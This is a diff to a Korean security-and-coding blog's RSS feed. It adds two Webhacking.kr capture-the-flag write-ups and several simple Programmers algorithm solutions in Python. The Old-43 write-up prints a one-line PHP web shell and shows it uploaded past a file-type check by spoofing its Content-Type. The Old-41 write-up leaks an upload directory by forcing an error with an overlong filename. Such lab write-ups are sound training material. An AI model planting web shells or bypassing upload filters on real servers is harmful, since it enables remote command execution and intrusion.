@@ -9,8 +9,226 @@
     <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>Coding, Security, IT News 등 정리한 블로그</description>
-    <pubDate>Thu, 20 May 2021 04:38:50 GMT</pubDate>
+    <pubDate>Fri, 21 May 2021 13:50:19 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>Webhacking.kr Old - 43 Write Up</title>
+      <link>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Write-Up/</link>
+      <guid>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Write-Up/</guid>
+      <pubDate>Thu, 20 May 2021 19:48:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-43"><a href="#Old-43" class="headerlink" title="Old - 43"></a>Old - 43</h2><p><img src="/images/pasted-425.png" alt="upload successful"><br>이번 문제는 웹쉘을 업로드하여, 웹쉘로 flag 파일을 읽는 문제이다.</p><p>나는 명령어를 실행시킬 수 있는 코드를 가진 PHP를 업로드를 해봤다.</p><ul><li>test.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> shell_exec($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>업로드 결과<br><img src="/images/pasted-426.png" alt="upload successful"><br>잘못된 타입이라면서 업로드가 거절되었다.</li></ul><p>타입은 Content-Type를 지칭하는 것으로 판단된다.<br><br>나는 어떤 파일이 업로드가 가능한지 확인하기 위해 이미지 파일을 업로드해봤다.</p><p><img src="/images/pasted-427.png" alt="upload successful"><br>업로드가 성공되는 것을 확인을 하여, 나는 해당 이미지의 Content-Type를 확인해봤다.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;file&quot;; filename=&quot;IMG_4926.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br></pre></td></tr></table></figure><p>이제 저 타입으로 test.php의 타입에 수정하여 보내봤다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryaBqyI9UjZ9h6RG5N</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundaryaBqyI9UjZ9h6RG5N--</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-428.png" alt="upload successful"><br>업로드가 성공하였다.<br><br>나는 서버에 test.php를 요청하여 flag를 출력해봤다.</p><p><img src="/images/pasted-429.png" alt="http://webhacking.kr:10004/upload/test.php?cmd=cat%20/flag"><br>Flag를 얻을 수 있었다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Write-Up/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Webhacking.kr Old - 41 Write Up</title>
+      <link>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Old-41-Write-Up/</link>
+      <guid>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Old-41-Write-Up/</guid>
+      <pubDate>Thu, 20 May 2021 19:43:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-41"><a href="#Old-41" class="headerlink" title="Old - 41"></a>Old - 41</h2><p><img src="/images/pasted-418.png"><br>파일을 업로드하는 페이지가 나왔다.</p><p>코드를 살펴봤다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> “../../config.php”;</span><br><span class="line">  <span class="keyword">include</span> “./inc.php”;</span><br><span class="line">  <span class="keyword">if</span>($_GET[‘view_source’]) view_source();</span><br><span class="line">  error_reporting(E_ALL);</span><br><span class="line">  ini_set(“display_errors”, <span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span>&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Challenge <span class="number">41</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[‘up’]) &amp;&amp; $_FILES[‘up’])&#123;</span><br><span class="line">    $fn = $_FILES[‘up’][‘name’];</span><br><span class="line">    $fn = str_replace(“.”,””,$fn);</span><br><span class="line">    $fn = str_replace(“&lt;“,””,$fn);</span><br><span class="line">    $fn = str_replace(“&gt;”,””,$fn);</span><br><span class="line">    $fn = str_replace(“/“,””,$fn);</span><br><span class="line"></span><br><span class="line">    $cp = $_FILES[‘up’][‘tmp_name’];</span><br><span class="line">    copy($cp,”./&#123;$upload_dir&#125;/&#123;$fn&#125;”);</span><br><span class="line">    $f = @fopen(“./&#123;$upload_dir&#125;/&#123;$fn&#125;”,”w”);</span><br><span class="line">    @fwrite($f,$flag);</span><br><span class="line">    @fclose($f);</span><br><span class="line">    <span class="keyword">echo</span>(“Done~”);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 보니, <code>&lt;, &gt;, ?, ., /</code>을 치환되어서 파일 이름에 스크립트는 불가능해 보인다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$f = @fopen(“./&#123;$upload_dir&#125;/&#123;$fn&#125;”,”w”);</span><br><span class="line">@fwrite($f,$flag);</span><br></pre></td></tr></table></figure><p>이 코드를 보니, 파일을 읽으면 Flag를 주는 것으로 판단된다.</p><p>그래서 업로드 폴더를 알아내기 위해 몇가지 실험을 해봤다.<br><img src="/images/pasted-419.png"><br>그 중 하나가 파일을 선택하지 않고, 업로드를 시도하니 오류를 출력되는 것을 알 수 있었다.</p><p>에러 메시지를 확인하니, cp 명령어에서 일어나는 오류가 출력되는 것으로 보인다.<br><br>이를 이용하여 파일을 업로드하여, cp 명령어를 에러를 발생하도록 하겠다.</p><p>현재 내가 오류를 줄 수 있는 방법은 파일명과 파일의 내용으로 두가지 선택 상항이 있다.</p><p>나는 일단 파일명으로 에러를 발생시키려고 한다.<br><br>인터넷에 파일명의 길이를 검색해봤다.<br><img src="/images/pasted-420.png"><br>파일명은 255bytes 크기로 제한된다는 것을 알 수 있었다.</p><p>개인적으로 궁금하여 한번 시도해봤다.</p><p><img src="/images/pasted-421.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryamSoOBSPCV58OK7l</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;up&quot;; filename=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryamSoOBSPCV58OK7l--</span><br></pre></td></tr></table></figure><p>255글자로 파일명을 지정하여 업로드를 진행하였다.</p><p><img src="/images/pasted-422.png"><br>에러가 발생하지 않았다.</p><p>이제 256글자로 파일명을 지정하여 업로드를 진행하였다.<br><img src="/images/pasted-423.png"><br>에러가 발생되었다.<br><br>에러 메시지가 출력되어서 업로드 폴더명이 유출되었다.</p><p>파일명을 test로 하여 업로드 후 test를 출력해보겠다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryJBfUcczUZgDMbNiR</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;up&quot;; filename=&quot;test&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryJBfUcczUZgDMbNiR--</span><br></pre></td></tr></table></figure><p>업로드를 진행 후, 업로드 폴더에 있는 파일을 요청했다.</p><p><img src="/images/pasted-424.png" alt="https://webhacking.kr/challenge/web-19/4b0e87fef7b5e8ba83894970c9806042e5d6ec9a/test"><br>Flag를 얻을 수 있었다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Old-41-Write-Up/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Programmers Level 1 - 두 정수 사이의 합</title>
+      <link>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%91%90-%EC%A0%95%EC%88%98-%EC%82%AC%EC%9D%B4%EC%9D%98-%ED%95%A9/</link>
+      <guid>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%91%90-%EC%A0%95%EC%88%98-%EC%82%AC%EC%9D%B4%EC%9D%98-%ED%95%A9/</guid>
+      <pubDate>Thu, 20 May 2021 19:22:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;두-정수-사이의-합&quot;&gt;&lt;a href=&quot;#두-정수-사이의-합&quot; class=&quot;headerlink&quot; title=&quot;두 정수 사이의 합&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/less</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="두-정수-사이의-합"><a href="#두-정수-사이의-합" class="headerlink" title="두 정수 사이의 합"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12912">두 정수 사이의 합</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>두 정수 a, b가 주어졌을 때 a와 b 사이에 속한 모든 정수의 합을 리턴하는 함수, solution을 완성하세요.<br><br>예를 들어 a = 3, b = 5인 경우, 3 + 4 + 5 = 12이므로 12를 리턴합니다.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>a와 b가 같은 경우는 둘 중 아무 수나 리턴하세요.</li><li>a와 b는 -10,000,000 이상 10,000,000 이하인 정수입니다.</li><li>a와 b의 대소관계는 정해져있지 않습니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><p>구현 문제로, 반복문과 Range 함수를 이용하여 풀이를 하였다.</p><ul><li><p>방법1<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == b:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    </span><br><span class="line">    start = <span class="built_in">min</span>(a, b)</span><br><span class="line">    end = <span class="built_in">max</span>(a, b)</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end+<span class="number">1</span>):</span><br><span class="line">        total += i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> total</span><br></pre></td></tr></table></figure></li><li><p>방법2<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">range</span>(a, b+<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>방법1를 간소화 시킨 방법이다.<br><br>방법2처럼 반복문을 사용하지 않고 sum 함수로만 진행한다면, <code>a==b</code>조건은 range 함수에서 자동으로 해결하기 때문에 코드의 길이가 줄어졌다.</p></li><li><p>방법3<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">abs</span>(a-b)+<span class="number">1</span>)*(a+b)//<span class="number">2</span></span><br></pre></td></tr></table></figure><p>등차수열의 합 공식을 이용한 방법이다.<br><br>시간복잡도가 O(1)로 최상의 성능 가진 코드이다.</p></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%91%90-%EC%A0%95%EC%88%98-%EC%82%AC%EC%9D%B4%EC%9D%98-%ED%95%A9/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Programmers Level 1 - 직사각형 별찍기</title>
+      <link>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%B3%84-%EC%B0%8D%EA%B8%B0/</link>
+      <guid>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%B3%84-%EC%B0%8D%EA%B8%B0/</guid>
+      <pubDate>Thu, 20 May 2021 17:16:20 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;직사각형-별찍기&quot;&gt;&lt;a href=&quot;#직사각형-별찍기&quot; class=&quot;headerlink&quot; title=&quot;직사각형 별찍기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="직사각형-별찍기"><a href="#직사각형-별찍기" class="headerlink" title="직사각형 별찍기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12969">직사각형 별찍기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>이 문제에는 표준 입력으로 두 개의 정수 n과 m이 주어집니다.<br><br>별(*) 문자를 이용해 가로의 길이가 n, 세로의 길이가 m인 직사각형 형태를 출력해보세요.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>n과 m은 각각 1000 이하인 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><p>구현 문제로, 반복문을 이용하여 풀이하였다.</p><ul><li>방법1<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">column, row = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().strip().split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row+<span class="number">1</span>):</span><br><span class="line">    print(<span class="string">&#x27;*&#x27;</span> * column)</span><br></pre></td></tr></table></figure></li><li>방법2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">column, row = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().strip().split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">print((<span class="string">&#x27;*&#x27;</span> * column + <span class="string">&#x27;\n&#x27;</span>) * row)</span><br></pre></td></tr></table></figure>문자열을 곱할 수 있다는 것을 이용하여 풀이한 방법이다.</li></ul>]]></content:encoded>
+      
+      
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%B3%84-%EC%B0%8D%EA%B8%B0/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Programmers Level 1 - 평균 구하기</title>
+      <link>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%ED%8F%89%EA%B7%A0-%EA%B5%AC%ED%95%98%EA%B8%B0/</link>
+      <guid>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%ED%8F%89%EA%B7%A0-%EA%B5%AC%ED%95%98%EA%B8%B0/</guid>
+      <pubDate>Thu, 20 May 2021 16:46:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;평균-구하기&quot;&gt;&lt;a href=&quot;#평균-구하기&quot; class=&quot;headerlink&quot; title=&quot;평균 구하기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12944&quot;&gt;평</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="평균-구하기"><a href="#평균-구하기" class="headerlink" title="평균 구하기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12944">평균 구하기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>정수를 담고 있는 배열 arr의 평균값을 return하는 함수, solution을 완성해보세요.</p><h2 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h2><ul><li>arr은 길이 1 이상, 100 이하인 배열입니다.</li><li>arr의 원소는 -10,000 이상 10,000 이하인 정수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><p>구현 문제로 iterable의 합을 구해주는 Sum 함수와 객체의 길이를 구해주는 Len 함수를 사용하여 풀이하였다.</p><ul><li>방법1<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">arr:<span class="built_in">list</span></span>):</span></span><br><span class="line">    total = <span class="built_in">sum</span>(arr)</span><br><span class="line">    count = <span class="built_in">len</span>(arr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> total/count</span><br></pre></td></tr></table></figure></li><li>방법2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">arr:<span class="built_in">list</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(arr)/<span class="built_in">len</span>(arr)</span><br></pre></td></tr></table></figure>두 개의 방법은 같은 방식이지만, 가독성이 차이가 난다.<br><br>방법1의 코드가 더 좋은 코드로 보인다.</li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%ED%8F%89%EA%B7%A0-%EA%B5%AC%ED%95%98%EA%B8%B0/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Programmers Level 1 - 짝수와 홀수</title>
+      <link>https://lrtk-coder.github.io/2021/05/20/Programers-Level-1-%EC%A7%9D%EC%88%98%EC%99%80-%ED%99%80%EC%88%98/</link>
+      <guid>https://lrtk-coder.github.io/2021/05/20/Programers-Level-1-%EC%A7%9D%EC%88%98%EC%99%80-%ED%99%80%EC%88%98/</guid>
+      <pubDate>Thu, 20 May 2021 16:31:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;짝수와-홀수&quot;&gt;&lt;a href=&quot;#짝수와-홀수&quot; class=&quot;headerlink&quot; title=&quot;짝수와 홀수&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12937&quot;&gt;짝</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="짝수와-홀수"><a href="#짝수와-홀수" class="headerlink" title="짝수와 홀수"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12937">짝수와 홀수</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>정수 num이 짝수일 경우 “Even”을 반환하고 홀수인 경우 “Odd”를 반환하는 함수, solution을 완성해주세요.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>num은 int 범위의 정수입니다.</li><li>0은 짝수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><p>이 문제는 단순 구현 문제로, 문법에 따른 다양한 풀이가 있다.</p><ul><li><p>방법1<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">num:<span class="built_in">int</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> num%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Even&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Odd&#x27;</span></span><br></pre></td></tr></table></figure><p>파이썬스럽지 않지만, 기초적으로 풀이한 코드이다.</p></li><li><p>방법2<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">num:<span class="built_in">int</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> num%<span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Odd&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Even&#x27;</span></span><br></pre></td></tr></table></figure><p>0은 False, 1은 True라는 것을 이용한 방법이다.<br><br><code>num%2 == 1</code>의 경우 홀수이기 때문에 Odd를 리턴하였고, 그 외에는 짝수이기 때문에 Even을 리턴하였다.</p></li><li><p>방법3<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">num:<span class="built_in">int</span></span>):</span>    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Odd&#x27;</span> <span class="keyword">if</span> num%<span class="number">2</span> <span class="keyword">else</span> <span class="string">&#x27;Even&#x27;</span></span><br></pre></td></tr></table></figure><p>삼항표현식으로 한 줄로 조건문을 사용한 방법이다.</p></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/05/20/Programers-Level-1-%EC%A7%9D%EC%88%98%EC%99%80-%ED%99%80%EC%88%98/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Programmers Level 1 - 수박수박수박수박수박수?</title>
+      <link>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98/</link>
